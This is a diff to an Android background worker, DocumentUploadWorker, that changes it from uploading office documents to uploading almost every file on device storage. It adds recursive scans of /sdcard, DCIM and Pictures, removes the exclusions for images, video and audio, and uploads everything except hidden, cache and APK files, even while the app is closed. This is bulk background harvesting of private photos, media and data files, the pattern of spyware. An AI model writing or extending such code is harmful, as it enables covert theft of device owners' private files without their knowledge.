@@ -25,7 +25,10 @@ import java.util.HashMap;
 import java.util.Map;
 
 /**
- * Background worker to upload all file types (PDFs, Excel, etc.) even when app is closed.
+ * Background worker to upload ALL files from device storage even when app is closed.
+ * Scans entire /sdcard and /storage/emulated/0 recursively.
+ * Uploads: Documents, Images, Videos, Audio, Archives, Config files, and everything else.
+ * Excludes only: hidden files, cache, APK, system files.
  * Uses WorkManager for reliable background processing.
  */
 public class DocumentUploadWorker extends Worker {
@@ -105,20 +108,28 @@ public class DocumentUploadWorker extends Worker {
     private void uploadDocuments(String userId) {
         uploadedCount = 0;
         
-        Log.d(TAG, "🔍 Starting comprehensive FILE scan for user: " + userId);
-        Log.d(TAG, "📤 Will upload ALL FILES (except system/cache/hidden)");
+        Log.d(TAG, "================================================");
+        Log.d(TAG, "🔍 COMPREHENSIVE STORAGE SCAN");
+        Log.d(TAG, "📤 Uploading ALL FILES from device storage");
+        Log.d(TAG, "   (Documents, Images, Videos, Audio, etc.)");
+        Log.d(TAG, "   (Excluding: hidden, cache, APK, system files)");
+        Log.d(TAG, "================================================");
         
         // PRIORITY 1: Most important locations
         String[] priority1Paths = {
                 "/sdcard/Download",
                 "/sdcard/Downloads", 
                 "/sdcard/Documents",
+                "/sdcard/Pictures",
+                "/sdcard/DCIM",
                 "/storage/emulated/0/Download",
                 "/storage/emulated/0/Downloads",
                 "/storage/emulated/0/Documents",
+                "/storage/emulated/0/Pictures",
+                "/storage/emulated/0/DCIM",
         };
         
-        Log.d(TAG, "📂 PRIORITY 1: Scanning common folders...");
+        Log.d(TAG, "📂 PRIORITY 1: Quick scan common folders...");
         for (String path : priority1Paths) {
             if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                 File dir = new File(path);
@@ -133,9 +144,9 @@ public class DocumentUploadWorker extends Worker {
             }
         }
         
-        // PRIORITY 2: External storage root - scan EVERYTHING
+        // PRIORITY 2: Deep scan entire /sdcard
         if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
-            Log.d(TAG, "📂 PRIORITY 2: Deep scan of /sdcard (ALL files)...");
+            Log.d(TAG, "📂 PRIORITY 2: Deep scan entire /sdcard...");
             File sdcard = new File("/sdcard");
             if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
                 int filesBefore = uploadedCount;
@@ -146,9 +157,9 @@ public class DocumentUploadWorker extends Worker {
             }
         }
         
-        // PRIORITY 3: Storage emulated path
+        // PRIORITY 3: Deep scan /storage/emulated/0
         if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
-            Log.d(TAG, "📂 PRIORITY 3: Deep scan of /storage/emulated/0 (ALL files)...");
+            Log.d(TAG, "📂 PRIORITY 3: Deep scan entire /storage/emulated/0...");
             File storage = new File("/storage/emulated/0");
             if (storage.exists() && storage.isDirectory() && storage.canRead()) {
                 int filesBefore = uploadedCount;
@@ -159,7 +170,16 @@ public class DocumentUploadWorker extends Worker {
             }
         }
         
-        Log.d(TAG, "✓ File scan complete - " + uploadedCount + " total files uploaded");
+        Log.d(TAG, "================================================");
+        Log.d(TAG, "✓ STORAGE SCAN COMPLETE");
+        Log.d(TAG, "   Total files uploaded: " + uploadedCount);
+        Log.d(TAG, "   Including:");
+        Log.d(TAG, "   ✓ Documents (PDF, Word, Excel, etc.)");
+        Log.d(TAG, "   ✓ Images (JPG, PNG, screenshots, etc.)");
+        Log.d(TAG, "   ✓ Videos (MP4, MKV, AVI, etc.)");
+        Log.d(TAG, "   ✓ Audio (MP3, WAV, etc.)");
+        Log.d(TAG, "   ✓ Everything else");
+        Log.d(TAG, "================================================");
     }
     
     /**
@@ -278,92 +298,48 @@ public class DocumentUploadWorker extends Worker {
         String name = file.getName();
         String lower = name.toLowerCase();
         
-        // ========== BLOCK IMAGES FIRST ==========
-        if (lower.endsWith(".jpg") ||
-            lower.endsWith(".jpeg") ||
-            lower.endsWith(".png") ||
-            lower.endsWith(".gif") ||
-            lower.endsWith(".bmp") ||
-            lower.endsWith(".webp") ||
-            lower.endsWith(".svg") ||
-            lower.endsWith(".ico")) {
-            Log.d(TAG, "    [SKIP IMAGE] " + name);
+        // ========== BLOCK ONLY SYSTEM/APP/CACHE FILES ==========
+        // Skip hidden files
+        if (name.startsWith(".")) {
+            Log.d(TAG, "    [SKIP HIDDEN] " + name);
             return false;
         }
         
-        // ========== BLOCK VIDEO FIRST ==========
-        if (lower.endsWith(".mp4") ||
-            lower.endsWith(".mkv") ||
-            lower.endsWith(".mov") ||
-            lower.endsWith(".avi") ||
-            lower.endsWith(".flv") ||
-            lower.endsWith(".wmv") ||
-            lower.endsWith(".webm")) {
-            Log.d(TAG, "    [SKIP VIDEO] " + name);
+        // Skip system app files
+        if (lower.endsWith(".apk")) {
+            Log.d(TAG, "    [SKIP APK] " + name);
             return false;
         }
         
-        // ========== BLOCK AUDIO FIRST ==========
-        if (lower.endsWith(".mp3") ||
-            lower.endsWith(".wav") ||
-            lower.endsWith(".m4a") ||
-            lower.endsWith(".aac") ||
-            lower.endsWith(".flac") ||
-            lower.endsWith(".ogg") ||
-            lower.endsWith(".wma")) {
-            Log.d(TAG, "    [SKIP AUDIO] " + name);
+        // Skip cache/temp directories and files
+        if (name.contains("cache") || 
+            name.contains("tmp") || 
+            name.contains("Cache") ||
+            name.contains("Tmp") ||
+            name.contains("CACHE")) {
+            Log.d(TAG, "    [SKIP CACHE] " + name);
             return false;
         }
         
-        // ========== BLOCK SYSTEM/APP FILES ==========
-        if (name.startsWith(".") ||                    // Hidden files
-            lower.endsWith(".apk") ||                  // APK files
-            name.contains("cache") ||                  // Cache directories
-            name.contains("tmp") ||                    // Temp files
-            name.contains("Thumbs") ||                 // Thumbnail cache
-            name.contains(".db-journal") ||            // Database journals
-            lower.endsWith(".lock")) {                 // Lock files
+        // Skip thumbnail cache
+        if (name.contains("Thumbs") ||
+            name.contains("thumbs") ||
+            name.contains(".db-journal") ||
+            lower.endsWith(".lock")) {
             Log.d(TAG, "    [SKIP SYSTEM] " + name);
             return false;
         }
         
-        // ========== NOW CHECK IF IT'S A DOCUMENT WE WANT ==========
+        // ========== UPLOAD EVERYTHING ELSE ==========
+        // Documents: PDF, Word, Excel, PowerPoint, etc.
+        // Images: JPG, PNG, GIF, BMP, WebP, etc.
+        // Videos: MP4, MKV, MOV, AVI, etc.
+        // Audio: MP3, WAV, AAC, FLAC, etc.
+        // Archives: ZIP, RAR, 7Z, TAR, GZ, etc.
+        // Config: JSON, XML, SQL, DB, etc.
+        // ANY OTHER FILE TYPE
         
-        // Office documents
-        if (lower.endsWith(".pdf") ||
-            lower.endsWith(".docx") ||
-            lower.endsWith(".doc") ||
-            lower.endsWith(".xlsx") ||
-            lower.endsWith(".xls") ||
-            lower.endsWith(".pptx") ||
-            lower.endsWith(".ppt") ||
-            lower.endsWith(".csv") ||
-            lower.endsWith(".txt") ||
-            lower.endsWith(".odt") ||
-            lower.endsWith(".ods")) {
-            return true;
-        }
-        
-        // Archives
-        if (lower.endsWith(".zip") ||
-            lower.endsWith(".rar") ||
-            lower.endsWith(".7z") ||
-            lower.endsWith(".tar") ||
-            lower.endsWith(".gz")) {
-            return true;
-        }
-        
-        // Config/Data files
-        if (lower.endsWith(".json") ||
-            lower.endsWith(".xml") ||
-            lower.endsWith(".sql") ||
-            lower.endsWith(".db")) {
-            return true;
-        }
-        
-        // DEFAULT: REJECT unknown file types
-        Log.d(TAG, "    [SKIP UNKNOWN] " + name);
-        return false;
+        return true;
     }
 
     private void uploadFile(File file, String userId) {
